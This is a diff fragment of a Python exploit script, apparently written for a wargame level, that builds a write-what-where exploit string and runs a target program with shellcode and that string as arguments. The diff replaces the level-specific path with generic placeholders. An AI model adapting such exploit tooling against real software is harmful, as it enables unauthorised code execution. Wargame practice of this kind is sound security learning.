@@ -74,8 +74,8 @@ exploit += write_what(value, exploit, style)    # write our bytes
 
 print exploit
 
-path = "/levels/level8"
-args = ["level8", "1", shellcode, exploit]
+path = "/path/to/exe"
+args = ["exe_name", "arg_1", shellcode, exploit]
 env = {}
 
 os.chdir("/")
